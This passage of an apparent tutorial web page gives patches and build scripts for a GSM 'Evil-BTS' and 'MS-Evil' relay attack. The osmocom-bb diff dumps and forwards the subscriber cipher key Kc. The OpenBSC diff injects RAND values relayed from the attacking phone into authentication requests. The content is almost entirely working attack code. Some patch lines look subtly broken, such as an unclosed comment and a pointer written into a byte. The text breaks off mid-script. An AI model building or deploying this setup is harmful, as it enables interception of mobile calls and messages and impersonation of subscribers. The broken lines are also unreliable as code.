<div class="sourceCode" id="cb37"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb</span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout fixeria/trxcon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb38"><pre class="sourceCode patch code-with-copy"><code class="sourceCode diff"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru trx/src/host/layer23/src/mobile/gsm48_mm.c osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="dt">--- trx/src/host/layer23/src/mobile/gsm48_mm.c  2022-08-30 16:41:37.076916961 +0200</span></span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c   2022-08-30 15:51:17.267099639 +0200</span></span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1651,6 +1651,7 @@</span></span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a>     */</span>
<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a>    if (mm-&gt;est_cause == RR_EST_CAUSE_EMERGENCY &amp;&amp; set-&gt;emergency_imsi[0])</span>
<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a>        no_sim = 1;</span>
<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a><span class="va">+   LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (rand %s)\n", osmo_hexdump(ar-&gt;rand,16));  </span></span>
<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a>    gsm_subscr_generate_kc(ms, ar-&gt;key_seq, ar-&gt;rand, no_sim);</span>
<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a>    /* wait for auth response event from SIM */</span>
<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer23/src/mobile/subscriber.c</span></span>
<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a><span class="dt">--- trx/src/host/layer23/src/mobile/subscriber.c    2022-08-30 16:41:37.076916961 +0200</span></span>
<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ osmocom-bb/src/host/layer23/src/mobile/subscriber.c 2022-08-30 15:51:17.267099639 +0200</span></span>
<span id="cb38-15"><a href="#cb38-15" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -32,7 +32,7 @@</span></span>
<span id="cb38-16"><a href="#cb38-16" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/common/sap_proto.h&gt;</span>
<span id="cb38-17"><a href="#cb38-17" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/common/networks.h&gt;</span>
<span id="cb38-18"><a href="#cb38-18" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/vty.h&gt;</span>
<span id="cb38-19"><a href="#cb38-19" aria-hidden="true" tabindex="-1"></a><span class="st">-</span></span>
<span id="cb38-20"><a href="#cb38-20" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "client.h"</span></span>
<span id="cb38-21"><a href="#cb38-21" aria-hidden="true" tabindex="-1"></a> /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.</span>
<span id="cb38-22"><a href="#cb38-22" aria-hidden="true" tabindex="-1"></a>  * if list is changed, the result is not written back to SIM */</span>
<span id="cb38-23"><a href="#cb38-23" aria-hidden="true" tabindex="-1"></a> //#define TEST_EMPTY_FPLMN</span>
<span id="cb38-24"><a href="#cb38-24" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -369,6 +369,7 @@</span></span>
<span id="cb38-25"><a href="#cb38-25" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-26"><a href="#cb38-26" aria-hidden="true" tabindex="-1"></a>    /* key */</span>
<span id="cb38-27"><a href="#cb38-27" aria-hidden="true" tabindex="-1"></a>    memcpy(subscr-&gt;key, data, 8);</span>
<span id="cb38-28"><a href="#cb38-28" aria-hidden="true" tabindex="-1"></a><span class="va">+   //client(osmo_hexdump(subscr-&gt;key,8));</span></span>
<span id="cb38-29"><a href="#cb38-29" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-30"><a href="#cb38-30" aria-hidden="true" tabindex="-1"></a>    /* key sequence */</span>
<span id="cb38-31"><a href="#cb38-31" aria-hidden="true" tabindex="-1"></a>    subscr-&gt;key_seq = data[8] &amp; 0x07;</span>
<span id="cb38-32"><a href="#cb38-32" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -907,7 +908,7 @@</span></span>
<span id="cb38-33"><a href="#cb38-33" aria-hidden="true" tabindex="-1"></a>    struct msgb *nmsg;</span>
<span id="cb38-34"><a href="#cb38-34" aria-hidden="true" tabindex="-1"></a>    struct sim_hdr *nsh;</span>
<span id="cb38-35"><a href="#cb38-35" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-36"><a href="#cb38-36" aria-hidden="true" tabindex="-1"></a><span class="st">-   /* not a SIM */</span></span>
<span id="cb38-37"><a href="#cb38-37" aria-hidden="true" tabindex="-1"></a><span class="va">+   /* not a SIM</span></span>
<span id="cb38-38"><a href="#cb38-38" aria-hidden="true" tabindex="-1"></a>    if (!GSM_SIM_IS_READER(subscr-&gt;sim_type)</span>
<span id="cb38-39"><a href="#cb38-39" aria-hidden="true" tabindex="-1"></a>     || !subscr-&gt;sim_valid || no_sim) {</span>
<span id="cb38-40"><a href="#cb38-40" aria-hidden="true" tabindex="-1"></a>        struct gsm48_mm_event *nmme;</span>
<span id="cb38-41"><a href="#cb38-41" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -944,6 +945,7 @@</span></span>
<span id="cb38-42"><a href="#cb38-42" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-43"><a href="#cb38-43" aria-hidden="true" tabindex="-1"></a>        /* store sequence */</span>
<span id="cb38-44"><a href="#cb38-44" aria-hidden="true" tabindex="-1"></a>        subscr-&gt;key_seq = key_seq;</span>
<span id="cb38-45"><a href="#cb38-45" aria-hidden="true" tabindex="-1"></a><span class="va">+       //client(osmo_hexdump(vec-&gt;kc,8));</span></span>
<span id="cb38-46"><a href="#cb38-46" aria-hidden="true" tabindex="-1"></a>        memcpy(subscr-&gt;key, vec-&gt;kc, 8);</span>
<span id="cb38-47"><a href="#cb38-47" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-48"><a href="#cb38-48" aria-hidden="true" tabindex="-1"></a>        LOGP(DMM, LOGL_INFO, "Sending authentication response\n");</span>
<span id="cb38-49"><a href="#cb38-49" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -969,6 +971,7 @@</span></span>
<span id="cb38-50"><a href="#cb38-50" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-51"><a href="#cb38-51" aria-hidden="true" tabindex="-1"></a>    /* random */</span>
<span id="cb38-52"><a href="#cb38-52" aria-hidden="true" tabindex="-1"></a>    memcpy(msgb_put(nmsg, 16), rand, 16);</span>
<span id="cb38-53"><a href="#cb38-53" aria-hidden="true" tabindex="-1"></a><span class="va">+   LOGP(DMM, LOGL_NOTICE, "Key Sequence=%d\n",key_seq);</span></span>
<span id="cb38-54"><a href="#cb38-54" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-55"><a href="#cb38-55" aria-hidden="true" tabindex="-1"></a>    /* store sequence */</span>
<span id="cb38-56"><a href="#cb38-56" aria-hidden="true" tabindex="-1"></a>    subscr-&gt;key_seq = key_seq;</span>
<span id="cb38-57"><a href="#cb38-57" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1019,7 +1022,9 @@</span></span>
<span id="cb38-58"><a href="#cb38-58" aria-hidden="true" tabindex="-1"></a>    nsh-&gt;file = 0x6f20;</span>
<span id="cb38-59"><a href="#cb38-59" aria-hidden="true" tabindex="-1"></a>    data = msgb_put(nmsg, 9);</span>
<span id="cb38-60"><a href="#cb38-60" aria-hidden="true" tabindex="-1"></a>    memcpy(data, subscr-&gt;key, 8);</span>
<span id="cb38-61"><a href="#cb38-61" aria-hidden="true" tabindex="-1"></a><span class="st">-   data[8] = subscr-&gt;key_seq;</span></span>
<span id="cb38-62"><a href="#cb38-62" aria-hidden="true" tabindex="-1"></a><span class="va">+        LOGP(DMM, LOGL_NOTICE, "KC=%s\n",osmo_hexdump(subscr-&gt;key,8));</span></span>
<span id="cb38-63"><a href="#cb38-63" aria-hidden="true" tabindex="-1"></a><span class="va">+   client(osmo_hexdump(subscr-&gt;key,8));</span></span>
<span id="cb38-64"><a href="#cb38-64" aria-hidden="true" tabindex="-1"></a><span class="va">+   data[8] = subscr-&gt;key;</span></span>
<span id="cb38-65"><a href="#cb38-65" aria-hidden="true" tabindex="-1"></a>    sim_job(ms, nmsg);</span>
<span id="cb38-66"><a href="#cb38-66" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb38-67"><a href="#cb38-67" aria-hidden="true" tabindex="-1"></a>    /* return signed response */</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="patch-openbsc-evil-bts-1" class="level2">
<h2 class="anchored" data-anchor-id="patch-openbsc-evil-bts-1">Patch OpenBSC Evil-BTS:</h2>
<div class="sourceCode" id="cb39"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/openbsc</span>
<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 3f457a3b79e2908664b40eab9ca8e70c44a54898</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb40"><pre class="sourceCode patch code-with-copy"><code class="sourceCode diff"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru openbsc/openbsc/src/libmsc/gsm_04_08.c bsc-2rfa/openbsc/src/libmsc/gsm_04_08.c</span></span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="dt">--- openbsc/openbsc/src/libmsc/gsm_04_08.c  2022-08-30 16:59:20.033455224 +0200</span></span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ bsc-2rfa/openbsc/src/libmsc/gsm_04_08.c 2022-08-30 15:51:17.243099474 +0200</span></span>
<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -70,7 +70,10 @@</span></span>
<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/gsm/tlv.h&gt;</span>
<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a> #include &lt;assert.h&gt;</span>
<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "server.h"</span></span>
<span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "hex.h"</span></span>
<span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "client.h"</span></span>
<span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-12"><a href="#cb40-12" aria-hidden="true" tabindex="-1"></a> void *tall_locop_ctx;</span>
<span id="cb40-13"><a href="#cb40-13" aria-hidden="true" tabindex="-1"></a> void *tall_authciphop_ctx;</span>
<span id="cb40-14"><a href="#cb40-14" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb40-15"><a href="#cb40-15" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -908,6 +911,20 @@</span></span>
<span id="cb40-16"><a href="#cb40-16" aria-hidden="true" tabindex="-1"></a>    struct msgb *msg = gsm48_msgb_alloc_name("GSM 04.08 AUTH REQ");</span>
<span id="cb40-17"><a href="#cb40-17" aria-hidden="true" tabindex="-1"></a>    struct gsm48_hdr *gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));</span>
<span id="cb40-18"><a href="#cb40-18" aria-hidden="true" tabindex="-1"></a>    struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar));</span>
<span id="cb40-19"><a href="#cb40-19" aria-hidden="true" tabindex="-1"></a><span class="va">+        DEBUGP(DMM, "-&gt; AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));</span></span>
<span id="cb40-20"><a href="#cb40-20" aria-hidden="true" tabindex="-1"></a><span class="va">+   </span></span>
<span id="cb40-21"><a href="#cb40-21" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb40-22"><a href="#cb40-22" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb40-23"><a href="#cb40-23" aria-hidden="true" tabindex="-1"></a><span class="va">+   char *test;</span></span>
<span id="cb40-24"><a href="#cb40-24" aria-hidden="true" tabindex="-1"></a><span class="va">+   test=catch_rand();</span></span>
<span id="cb40-25"><a href="#cb40-25" aria-hidden="true" tabindex="-1"></a><span class="va">+   printf("test %s\n",test);</span></span>
<span id="cb40-26"><a href="#cb40-26" aria-hidden="true" tabindex="-1"></a><span class="va">+   char *randy=strtok(test," -");</span></span>
<span id="cb40-27"><a href="#cb40-27" aria-hidden="true" tabindex="-1"></a><span class="va">+   printf("rand %s\n",rand);</span></span>
<span id="cb40-28"><a href="#cb40-28" aria-hidden="true" tabindex="-1"></a><span class="va">+   char *kandy_seq=strtok(NULL,"-");</span></span>
<span id="cb40-29"><a href="#cb40-29" aria-hidden="true" tabindex="-1"></a><span class="va">+   printf("key_seq %s\n",kandy_seq);</span></span>
<span id="cb40-30"><a href="#cb40-30" aria-hidden="true" tabindex="-1"></a><span class="va">+   char *randy_magnum = spaces(randy);</span></span>
<span id="cb40-31"><a href="#cb40-31" aria-hidden="true" tabindex="-1"></a><span class="va">+        const unsigned char *randynator=hex2ascii(randy_magnum);</span></span>
<span id="cb40-32"><a href="#cb40-32" aria-hidden="true" tabindex="-1"></a><span class="va">+        memcpy(rand,randynator,16);</span></span>
<span id="cb40-33"><a href="#cb40-33" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb40-34"><a href="#cb40-34" aria-hidden="true" tabindex="-1"></a>    DEBUGP(DMM, "-&gt; AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));</span>
<span id="cb40-35"><a href="#cb40-35" aria-hidden="true" tabindex="-1"></a>    if (autn)</span>
<span id="cb40-36"><a href="#cb40-36" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -917,7 +934,7 @@</span></span>
<span id="cb40-37"><a href="#cb40-37" aria-hidden="true" tabindex="-1"></a>    gh-&gt;proto_discr = GSM48_PDISC_MM;</span>
<span id="cb40-38"><a href="#cb40-38" aria-hidden="true" tabindex="-1"></a>    gh-&gt;msg_type = GSM48_MT_MM_AUTH_REQ;</span>
<span id="cb40-39"><a href="#cb40-39" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb40-40"><a href="#cb40-40" aria-hidden="true" tabindex="-1"></a><span class="st">-   ar-&gt;key_seq = key_seq;</span></span>
<span id="cb40-41"><a href="#cb40-41" aria-hidden="true" tabindex="-1"></a><span class="va">+   ar-&gt;key_seq = kandy_seq;</span></span>
<span id="cb40-42"><a href="#cb40-42" aria-hidden="true" tabindex="-1"></a> </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="installing-bts-evil-1" class="level2">
<h2 class="anchored" data-anchor-id="installing-bts-evil-1">Installing BTS-Evil:</h2>
<div class="sourceCode" id="cb41"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/bbaranoff/heartbreaker</span>
<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /heartbreaker</span>
<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /heartbreaker</span>
<span id="cb41-6"><a href="#cb41-6" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev <span class="at">-y</span></span>
<span id="cb41-7"><a href="#cb41-7" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /usr/bin/python2 /usr/bin/python</span>
<span id="cb41-8"><a href="#cb41-8" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-9 90 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-9</span>
<span id="cb41-9"><a href="#cb41-9" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-10 100 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-10</span>
<span id="cb41-10"><a href="#cb41-10" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb41-11"><a href="#cb41-11" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmocore.git</span>
<span id="cb41-12"><a href="#cb41-12" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span>  libosmocore</span>
<span id="cb41-13"><a href="#cb41-13" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 1.1.0</span>
<span id="cb41-14"><a href="#cb41-14" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb41-15"><a href="#cb41-15" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb41-16"><a href="#cb41-16" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb41-17"><a href="#cb41-17" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb41-18"><a href="#cb41-18" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb41-19"><a href="#cb41-19" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb41-20"><a href="#cb41-20" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmo-dsp.git</span>
<span id="cb41-21"><a href="#cb41-21" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-dsp</span>
<span id="cb41-22"><a href="#cb41-22" aria-hidden="true" tabindex="-1"></a><span class="ex">libtoolize</span> <span class="kw">&amp;&amp;</span> <span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb41-23"><a href="#cb41-23" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb41-24"><a href="#cb41-24" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb41-25"><a href="#cb41-25" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb41-26"><a href="#cb41-26" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb41-27"><a href="#cb41-27" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb41-28"><a href="#cb41-28" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install <span class="at">-y</span> libortp-dev</span>
<span id="cb41-29"><a href="#cb41-29" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb41-30"><a href="#cb41-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-31"><a href="#cb41-31" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb</span>
<span id="cb41-32"><a href="#cb41-32" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> osmocom-bb/src</span>
<span id="cb41-33"><a href="#cb41-33" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout fixeria/trxcon</span>
<span id="cb41-34"><a href="#cb41-34" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> nofirmware</span>
<span id="cb41-35"><a href="#cb41-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-36"><a href="#cb41-36" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../..</span>
<span id="cb41-37"><a href="#cb41-37" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-abis</span>
<span id="cb41-38"><a href="#cb41-38" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-abis</span>
<span id="cb41-39"><a href="#cb41-39" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb41-40"><a href="#cb41-40" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--disable-dahdi</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb41-41"><a href="#cb41-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-42"><a href="#cb41-42" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb41-43"><a href="#cb41-43" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-netif</span>
<span id="cb41-44"><a href="#cb41-44" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-netif</span>
<span id="cb41-45"><a href="#cb41-45" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.6.0</span>
<span id="cb41-46"><a href="#cb41-46" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb41-47"><a href="#cb41-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-48"><a href="#cb41-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-49"><a href="#cb41-49" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> bsc-2rfa/openbsc</span>
<span id="cb41-50"><a href="#cb41-50" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span></span>
<span id="cb41-51"><a href="#cb41-51" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../..</span>
<span id="cb41-52"><a href="#cb41-52" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmo-bts</span>
<span id="cb41-53"><a href="#cb41-53" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> osmo-bts</span>
<span id="cb41-54"><a href="#cb41-54" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb41-55"><a href="#cb41-55" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--enable-trx</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb41-56"><a href="#cb41-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-57"><a href="#cb41-57" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install ruby-libxml ruby-dev ruby-dbus</span>
<span id="cb41-58"><a href="#cb41-58" aria-hidden="true" tabindex="-1"></a><span class="ex">gem</span> install serial smartcard</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="installing-ms-evil-2" class="level2">
<h2 class="anchored" data-anchor-id="installing-ms-evil-2">Installing MS-Evil :</h2>
<div class="sourceCode" id="cb42"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/bbaranoff/heartbreaker</span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /heartbreaker</span>
<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /heartbreaker</span>
<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev <span class="at">-y</span></span>
<span id="cb42-7"><a href="#cb42-7" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /usr/bin/python2 /usr/bin/python</span>
<span id="cb42-8"><a href="#cb42-8" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-9 90 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-9</span>
<span id="cb42-9"><a href="#cb42-9" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-10 100 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-10</span>
<span id="cb42-10"><a href="#cb42-10" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb42-11"><a href="#cb42-11" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmocore.git</span>
<span id="cb42-12"><a href="#cb42-12" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span>  libosmocore</span>
<span id="cb42-13"><a href="#cb42-13" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 1.1.0</span>
<span id="cb42-14"><a href="#cb42-14" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb42-15"><a href="#cb42-15" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb42-16"><a href="#cb42-16" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb42-17"><a href="#cb42-17" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb42-18"><a href="#cb42-18" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb42-19"><a href="#cb42-19" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb42-20"><a href="#cb42-20" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmo-dsp.git</span>
<span id="cb42-21"><a href="#cb42-21" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-dsp</span>
<span id="cb42-22"><a href="#cb42-22" aria-hidden="true" tabindex="-1"></a><span class="ex">libtoolize</span> <span class="kw">&amp;&amp;</span> <span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb42-23"><a href="#cb42-23" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb42-24"><a href="#cb42-24" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb42-25"><a href="#cb42-25" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb42-26"><a href="#cb42-26" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb42-27"><a href="#cb42-27" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
